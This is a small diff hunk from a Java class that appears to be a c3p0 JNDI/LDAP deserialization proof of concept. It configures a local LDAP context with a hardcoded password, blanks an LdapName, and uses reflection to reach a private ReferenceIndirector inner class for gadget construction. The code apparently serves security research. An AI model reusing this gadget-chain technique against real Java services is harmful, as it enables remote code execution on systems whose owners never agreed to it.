@@ -22,7 +22,7 @@ public class c3p0_jndi_readobject_ldap {
         env.put(Context.SECURITY_PRINCIPAL,"dc=example,dc=com");
         env.put(Context.SECURITY_CREDENTIALS, "123456");
         env.put(Context.PROVIDER_URL,"ldap://127.0.0.1:1389");
-        Name name = new LdapName("pysnow");
+        Name name = new LdapName("");
 
         Constructor<?> refconz = ReferenceIndirector.class.getDeclaredClasses()[0].getDeclaredConstructors()[0];
         refconz.setAccessible(true);
